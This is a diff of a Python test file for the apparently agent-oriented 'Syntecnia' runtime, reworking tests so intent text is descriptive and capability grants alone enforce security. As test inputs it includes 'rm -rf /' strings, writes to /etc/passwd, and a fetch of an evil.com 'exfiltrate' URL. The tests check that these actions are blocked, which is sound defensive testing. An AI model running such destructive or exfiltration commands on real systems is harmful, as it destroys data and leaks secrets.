@@ -1,99 +1,70 @@
-"""Tests for Syntecnia intent enforcement system."""
+"""Tests for Syntecnia intent system.
+
+The intent is DESCRIPTIVE only — it does NOT block actions. Security is
+enforced exclusively by capabilities. These tests verify that contract:
+predictable, language-agnostic, with one explicit authorization model.
+"""
 import sys
 sys.path.insert(0, "/root/Syntecnia")
 
-from syntecnia.capabilities.intent import (
-    IntentEnforcer, ActionCategory, parse_intent, IntentScope,
-)
+from syntecnia.capabilities.intent import IntentEnforcer, ActionCategory, IntentScope
 from syntecnia.runtime.engine import SyntecniaEngine
-from syntecnia.capabilities.model import Capability, CapabilityType
 
 
-# -- Intent parsing --
+# -- Intent is descriptive --
 
-def test_parse_intent_keywords():
-    scope = parse_intent("Process customer orders and send confirmations")
-    assert ActionCategory.DATA_READ in scope.categories
-    assert ActionCategory.DATA_WRITE in scope.categories
-    assert ActionCategory.COMPUTE in scope.categories
-    assert ActionCategory.COMMUNICATE in scope.categories
-
-
-def test_parse_intent_extracts_domains():
-    scope = parse_intent("Fetch data from api.example.com and upload to storage.cloud.com")
-    assert "api.example.com" in scope.allowed_domains
-    assert "storage.cloud.com" in scope.allowed_domains
-
-
-def test_parse_intent_extracts_paths():
-    scope = parse_intent("Read files from /data/reports/* and write to /output/results/*")
-    assert "/data/reports/*" in scope.allowed_paths
-    assert "/output/results/*" in scope.allowed_paths
-
-
-def test_parse_intent_no_exec_if_not_mentioned():
-    scope = parse_intent("Read and analyze customer feedback")
-    assert ActionCategory.EXEC not in scope.categories
-
-
-def test_parse_intent_exec_when_mentioned():
-    scope = parse_intent("Build the project and run tests")
-    assert ActionCategory.EXEC in scope.categories
-
-
-# -- Intent enforcer --
-
-def test_enforcer_no_intent_allows_all():
+def test_set_intent_stores_description():
     enforcer = IntentEnforcer()
-    # No intent set = permissive mode
-    assert enforcer.check_action(ActionCategory.NET_WRITE, "send data")
-    assert enforcer.check_action(ActionCategory.EXEC, "run command")
+    enforcer.set_intent("Process customer orders")
+    assert enforcer.intent.description == "Process customer orders"
 
 
-def test_enforcer_blocks_unauthorized_category():
+def test_no_intent_allows_all():
+    enforcer = IntentEnforcer()
+    assert enforcer.check_action(ActionCategory.NET_WRITE, "send")
+    assert enforcer.check_action(ActionCategory.EXEC, "run")
+
+
+def test_intent_does_not_block_any_category():
     enforcer = IntentEnforcer()
     enforcer.set_intent("Read and analyze data")
-    enforcer.strict = True
-    # Should allow reads and computation
-    assert enforcer.check_action(ActionCategory.DATA_READ, "read data")
-    assert enforcer.check_action(ActionCategory.COMPUTE, "calculate")
-    # Should block exec (not in intent)
-    assert not enforcer.check_action(ActionCategory.EXEC, "run rm -rf")
+    # Descriptive only: never blocks, regardless of category/domain/path.
+    assert enforcer.check_action(ActionCategory.EXEC, "run rm -rf")
+    assert enforcer.check_action(ActionCategory.NET_WRITE, "post", domain="evil.com")
+    assert enforcer.check_action(ActionCategory.FILE_WRITE, "write", path="/etc/passwd")
+    assert len(enforcer.violations) == 0
 
 
-def test_enforcer_blocks_unauthorized_domain():
+def test_intent_is_language_agnostic():
+    # Any text in any language is accepted as a description and never blocks.
+    for desc in ["Generar reportes", "Read files", "Faire un rapport", "report data"]:
+        enforcer = IntentEnforcer()
+        enforcer.set_intent(desc)
+        assert enforcer.check_action(ActionCategory.FILE_WRITE, "write")
+        assert enforcer.intent.description == desc
+
+
+def test_freeze_sets_flag():
     enforcer = IntentEnforcer()
-    enforcer.set_intent("Fetch data from api.example.com")
-    enforcer.strict = True
-    # Should allow the declared domain
-    assert enforcer.check_action(ActionCategory.NET_READ, "fetch", domain="api.example.com")
-    # Should block other domains
-    assert not enforcer.check_action(ActionCategory.NET_READ, "fetch", domain="evil.com")
+    enforcer.set_intent("Read data")
+    assert not enforcer.intent.frozen
+    enforcer.freeze_intent()
+    assert enforcer.intent.frozen
 
 
-def test_enforcer_blocks_unauthorized_path():
+def test_get_report_shows_description():
     enforcer = IntentEnforcer()
-    enforcer.set_intent("Read files from /data/*")
-    enforcer.strict = True
-    assert enforcer.check_action(ActionCategory.FILE_READ, "read", path="/data/report.csv")
-    assert not enforcer.check_action(ActionCategory.FILE_READ, "read", path="/etc/passwd")
+    enforcer.set_intent("Process orders")
+    report = enforcer.get_report()
+    assert "Process orders" in report
 
 
-def test_enforcer_always_allows_safe_categories():
-    enforcer = IntentEnforcer()
-    enforcer.set_intent("Do nothing")  # very restrictive
-    enforcer.strict = True
-    # These should always be allowed
-    assert enforcer.check_action(ActionCategory.COMPUTE, "math")
-    assert enforcer.check_action(ActionCategory.HUMAN_INTERACT, "ask user")
-    assert enforcer.check_action(ActionCategory.LLM_REASON, "think")
+# -- Engine-level behavior --
 
-
-def test_enforcer_freeze_prevents_expansion():
-    """Once frozen, new intent declarations should fail."""
+def test_freeze_prevents_redeclaration():
+    """Once execution starts, redeclaring the intent must fail (anti-injection)."""
     engine = SyntecniaEngine()
-    source = '''
-intent: "Read customer data"
+    source = '''intent: "Read customer data"
 let x be 42
 intent: "Read customer data AND delete all files"
 '''
@@ -102,71 +73,42 @@ intent: "Read customer data AND delete all files"
     assert any("frozen" in e.lower() or "intent" in e.lower() for e in result.errors)
 
 
-def test_enforcer_violation_report():
-    enforcer = IntentEnforcer()
-    enforcer.set_intent("Read data from api.shop.com")
-    enforcer.strict = True
-    enforcer.check_action(ActionCategory.NET_READ, "fetch api.shop.com", domain="api.shop.com")
-    enforcer.check_action(ActionCategory.EXEC, "run rm -rf /")
-    assert len(enforcer.violations) == 1
-    report = enforcer.get_report()
-    assert "Violations: 1" in report
-
-
-def test_intent_enforcement_in_engine_blocks_file_access():
-    """With intent enforcement, file access outside intent scope is blocked."""
+def test_security_comes_from_capabilities_not_intent():
+    """An undeclared action is blocked by capabilities, regardless of the intent text."""
     engine = SyntecniaEngine()
-    engine.grant_capability("file", "/tmp/*")  # capability is granted
-    # But intent only allows reading from /data/*
-    result = engine.run_source('''
-intent: "Read data from /data/*"
-let content be read_file("/tmp/some_file.txt")
+    result = engine.run_source('''intent: "Fetch anything from anywhere"
+let r be fetch("https://evil.com/exfiltrate")
 ''')
-    # Should fail because intent doesn't cover /tmp
     assert not result.success
-    assert any("intent" in e.lower() or "Intent" in e for e in result.errors)
+    assert any("capability" in e.lower() for e in result.errors)
 
 
-def test_intent_enforcement_allows_matching_operations():
-    """Operations matching the intent should work."""
+def test_intent_text_does_not_restrict_granted_capability():
+    """With the capability granted, the op works no matter what the intent says (any language)."""
+    import os
     engine = SyntecniaEngine()
     engine.grant_capability("file", "/tmp/*")
-    # Write a test file first
-    import os
-    with open("/tmp/syntecnia_intent_test.txt", "w") as f:
+    path = "/tmp/syntecnia_intent_test.txt"
+    with open(path, "w") as f:
         f.write("test data")
-
-    result = engine.run_source('''
-intent: "Read files from /tmp/*"
+    result = engine.run_source('''intent: "Solo analizar numeros en espanol"
 let content be read_file("/tmp/syntecnia_intent_test.txt")
 print(content)
 ''')
+    os.remove(path)
     assert result.success
     assert result.output == ["test data"]
 
-    os.remove("/tmp/syntecnia_intent_test.txt")
 
-
-def test_warn_mode_does_not_block():
-    """In non-strict mode, violations are logged but not blocked."""
+def test_undeclared_capability_blocks_even_with_describing_intent():
+    """Even if the intent text 'describes' the action, without require it is blocked."""
     engine = SyntecniaEngine()
-    engine.intent_enforcer.strict = False
-    engine.grant_capability("file", "/tmp/*")
-
-    with open("/tmp/syntecnia_warn_test.txt", "w") as f:
-        f.write("warn test")
-
-    result = engine.run_source('''
-intent: "Only analyze numbers"
-let content be read_file("/tmp/syntecnia_warn_test.txt")
-print(content)
+    # No grant for /tmp; intent text mentions reading, but that does not authorize anything.
+    result = engine.run_source('''intent: "Read files from /tmp"
+let content be read_file("/tmp/whatever_ungranted.txt")
 ''')
-    # Should succeed (warn only) but have violations logged
-    assert result.success
-    assert len(engine.intent_enforcer.violations) > 0
-
-    import os
-    os.remove("/tmp/syntecnia_warn_test.txt")
+    assert not result.success
+    assert any("capability" in e.lower() for e in result.errors)
 
 
 if __name__ == "__main__":
